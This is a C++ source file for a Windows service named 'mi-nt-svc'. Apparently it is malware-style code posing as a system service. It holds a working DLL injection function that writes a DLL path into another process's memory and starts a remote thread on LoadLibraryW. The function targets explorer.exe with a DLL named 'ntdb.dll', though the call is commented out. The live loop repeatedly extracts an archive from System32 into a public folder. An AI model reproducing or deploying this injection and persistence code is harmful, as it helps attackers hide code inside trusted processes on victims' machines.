// mi_id_svc.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include "pch.h"
#include <iostream>
#include <wtypes.h>
#include <stdio.h>
#include <winsvc.h>
#include <tlhelp32.h>
#include <tchar.h>
#include <sddl.h>
#include "zip_file.hpp"
#include <windows.h>

#define GD_SVC_NAME				L"mi-nt-svc"

SERVICE_STATUS_HANDLE lv_hServiceStatus;
HANDLE lv_thdService = NULL;
//HANDLE lv_hProcess = NULL;

BOOL	lv_ProcStop = FALSE;
DWORD	lv_dwProcess_Explorer = 0;

// Service control handler function
VOID WINAPI ServiceCtrlHandler(DWORD dwCtrl) {
	switch (dwCtrl) {
	case SERVICE_CONTROL_STOP:

		lv_ProcStop = TRUE;
		Sleep(2000);

		// Stop the service
		// Perform cleanup tasks here
		// Notify service controller that the service has stopped
		//if (lv_hProcess != NULL) {
		//	TerminateProcess(lv_hProcess, 0);
		//}
		if (lv_thdService != NULL) {
			TerminateThread(lv_thdService, 0);
		}
		SERVICE_STATUS serviceStatus;
		serviceStatus.dwCurrentState = SERVICE_STOPPED;
		SetServiceStatus(lv_hServiceStatus, &serviceStatus);
		break;
	default:
		break;
	}
}

unsigned long checkServiceStatus(const wchar_t* p_wszName)
{
	unsigned long lRet = 0;
	SC_HANDLE scmHandle = OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT);
	if (scmHandle == NULL) {
		return 0;
	}

	// Open a handle to the service.
	SC_HANDLE serviceHandle = OpenService(scmHandle, p_wszName, SERVICE_QUERY_STATUS);
	if (serviceHandle == NULL) {
		CloseServiceHandle(scmHandle);
		return 0;
	}

	// Query the service status.
	SERVICE_STATUS_PROCESS ssp;
	DWORD bytesNeeded;
	if (!QueryServiceStatusEx(serviceHandle, SC_STATUS_PROCESS_INFO, (LPBYTE)&ssp, sizeof(SERVICE_STATUS_PROCESS), &bytesNeeded)) {

	}
	else {
		if (ssp.dwCurrentState == SERVICE_STOPPED) {
			lRet = -1;
		}
	}

	// Close handles.
	CloseServiceHandle(serviceHandle);
	CloseServiceHandle(scmHandle);
	return lRet;
}

unsigned long startService(const wchar_t* p_wszName)
{
	unsigned long lRet = 0;
	SC_HANDLE schSCManager = NULL;
	SC_HANDLE schService = NULL;
	SERVICE_STATUS ssSvcStatus = {};

	// Open the local default service control manager database
	schSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT);
	if (schSCManager == NULL)
	{
		wprintf(L"OpenSCManager failed w/err 0x%08lx\n", GetLastError());
		lRet = GetLastError();
		goto Cleanup;
	}

	// Open the service with delete, stop, and query status permissions
	schService = OpenService(schSCManager, p_wszName, SERVICE_START);
	if (schService == NULL)
	{
		wprintf(L"OpenService failed w/err 0x%08lx\n", GetLastError());
		lRet = GetLastError();
		goto Cleanup;
	}

	if (StartService(schService, 0, NULL) == false) {
		wprintf(L"StartService failed w/err 0x%08lx\n", GetLastError());
		lRet = GetLastError();
		goto Cleanup;
	}

Cleanup:
	// Centralized cleanup for all allocated resources.
	if (schSCManager)
	{
		CloseServiceHandle(schSCManager);
		schSCManager = NULL;
	}
	if (schService)
	{
		CloseServiceHandle(schService);
		schService = NULL;
	}
	return lRet;
}

//.
DWORD GetExplorerPID() {
	DWORD pid = 0;
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnapshot != INVALID_HANDLE_VALUE) {
		PROCESSENTRY32 pe;
		pe.dwSize = sizeof(PROCESSENTRY32);
		if (Process32First(hSnapshot, &pe)) {
			do {
				if (_tcscmp(pe.szExeFile, _T("explorer.exe")) == 0) {
					pid = pe.th32ProcessID;
					break;
				}
			} while (Process32Next(hSnapshot, &pe));
		}
		CloseHandle(hSnapshot);
	}
	return pid;
}
void InjectDll(HANDLE p_hProcess, LPCWSTR p_wszDllPath /*= NULL*/) {
	wchar_t wszDllPath[MAX_PATH]; memset(wszDllPath, 0, sizeof(wszDllPath));
	wcscpy_s(wszDllPath, MAX_PATH, p_wszDllPath);
	unsigned int cchDllPath = sizeof(wszDllPath);

	HMODULE hKernel32 = GetModuleHandleA("Kernelbase.dll");
	FARPROC lb = GetProcAddress(hKernel32, "LoadLibraryW");

	HANDLE hProcess = p_hProcess;

	void* pMem = VirtualAllocEx(hProcess, NULL, cchDllPath, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	WriteProcessMemory(hProcess, pMem, wszDllPath, cchDllPath, NULL);
	HANDLE h = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)lb, pMem, 0, NULL);
	WaitForSingleObject(h, 1000);
	VirtualFreeEx(hProcess, pMem, 0, MEM_RELEASE);
	CloseHandle(h);
}
void UnzipFile(const std::string& zipPath, const std::string& extractPath) {

	int normalAttr = 0x81a4 << 16;
	std::string UnzipPath = extractPath;

	miniz_cpp::zip_file zipFile(zipPath);
	zipFile.printdir();
	std::vector<miniz_cpp::zip_info> zipInfos = zipFile.infolist();
	for (auto zi : zipInfos) {
		if (zi.external_attr == normalAttr) {
			zipFile.extractExternal(zi, UnzipPath + zi.filename);
		}
		else {
			std::string w_Dir = UnzipPath + zi.filename;
			CreateDirectoryA(w_Dir.c_str(), NULL);
			continue;

		}
	}
}

bool CheckCurrentUser() {
	bool			w_bRtn = false;

	HANDLE tokenHandle = nullptr;
	if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &tokenHandle)) {
		DWORD bufferSize = 0;
		GetTokenInformation(tokenHandle, TokenUser, nullptr, 0, &bufferSize);

		if (bufferSize) {
			PTOKEN_USER tokenUser = (PTOKEN_USER)malloc(bufferSize);
			if (GetTokenInformation(tokenHandle, TokenUser, tokenUser, bufferSize, &bufferSize)) {
				LPWSTR userSid = nullptr;
				ConvertSidToStringSid(tokenUser->User.Sid, &userSid);
				w_bRtn = true;
				LocalFree(userSid);
			}
			free(tokenUser);
		}
		CloseHandle(tokenHandle);
	}
	else {
	}

	return w_bRtn;
}

unsigned int TF_THREAD(void*) {
	wchar_t wszDir[MAX_PATH]; memset(wszDir, 0, sizeof(wszDir));
	wchar_t wszPath[MAX_PATH]; memset(wszPath, 0, sizeof(wszPath));

	GetModuleFileName(NULL, wszDir, MAX_PATH);
	wchar_t* pSlash = wcsrchr(wszDir, L'\\');
	if (pSlash != NULL) 
		pSlash[0] = 0x0;
	
	swprintf_s(wszPath, MAX_PATH, L"%s\\ntdb.dll", wszDir);

	while (lv_ProcStop == FALSE) {
		//if (CheckCurrentUser() == false) {
		//	Sleep(500);
		//	continue;
		//}

		//. Hook into Explorer
		UnzipFile("C:\\Windows\\System32\\data.zip", "C:\\Users\\Public\\data\\");

		//DWORD explorerPID = GetExplorerPID();
		//if (explorerPID == 0) {
		//	Sleep(500);
		//	continue;
		//}

		//if (lv_dwProcess_Explorer != explorerPID) {
		//	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, explorerPID);
		//	if (!hProcess) {
		//		Sleep(500);
		//		continue;
		//	}
		//	lv_dwProcess_Explorer = explorerPID;
		//	InjectDll(hProcess, wszPath);
		//}

		Sleep(500);
	}
	return 0;
}

void RunService() {
	DWORD dwTID;
	lv_thdService = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)TF_THREAD, NULL, 0, &dwTID);
	WaitForSingleObject(lv_thdService, INFINITE);
}

VOID WINAPI ServiceMain(DWORD argc, LPTSTR* argv) {
	OutputDebugStringA("SfT - Service Main\n");

	lv_ProcStop = FALSE;

	// Register service control handler
	lv_hServiceStatus = RegisterServiceCtrlHandler(GD_SVC_NAME, ServiceCtrlHandler);
	if (!lv_hServiceStatus) {
		return;
	}

	// Notify service controller that the service is starting
	SERVICE_STATUS serviceStatus;
	serviceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
	serviceStatus.dwCurrentState = SERVICE_START_PENDING;
	serviceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;
	serviceStatus.dwWin32ExitCode = NO_ERROR;
	serviceStatus.dwServiceSpecificExitCode = 0;
	serviceStatus.dwCheckPoint = 0;
	serviceStatus.dwWaitHint = 0;
	SetServiceStatus(lv_hServiceStatus, &serviceStatus);

	// Perform initialization tasks here

	// Notify service controller that the service is running
	serviceStatus.dwCurrentState = SERVICE_RUNNING;
	SetServiceStatus(lv_hServiceStatus, &serviceStatus);

	while (lv_ProcStop == FALSE){
		// Run the service
		RunService();
		Sleep(1000);
	}

	// Notify service controller that the service has stopped
	serviceStatus.dwCurrentState = SERVICE_STOPPED;
	SetServiceStatus(lv_hServiceStatus, &serviceStatus);
}

int _tmain(int argc, TCHAR* argv[]) {
{
	OutputDebugStringA("SfT---Start");
	wchar_t p[] = GD_SVC_NAME;

	SERVICE_TABLE_ENTRYW ServiceTable[] =
	{
		{ (LPWSTR)GD_SVC_NAME, (LPSERVICE_MAIN_FUNCTION)ServiceMain },
		{ NULL, NULL }
	};

	// Start the service control dispatcher
	if (!StartServiceCtrlDispatcher(ServiceTable)) {
		//		std::cerr << "Failed to start service control dispatcher\n";
		OutputDebugStringA("SfT---exit");
		return GetLastError();
	}
	return 0;
}

// Run program: Ctrl + F5 or Debug > Start Without Debugging menu
// Debug program: F5 or Debug > Start Debugging menu

// Tips for Getting Started: 
//   1. Use the Solution Explorer window to add/manage files
//   2. Use the Team Explorer window to connect to source control
//   3. Use the Output window to see build output and other messages
//   4. Use the Error List window to view errors
//   5. Go to Project > Add New Item to create new code files, or Project > Add Existing Item to add existing code files to the project
//   6. In the future, to open this project again, go to File > Open > Project and select the .sln file
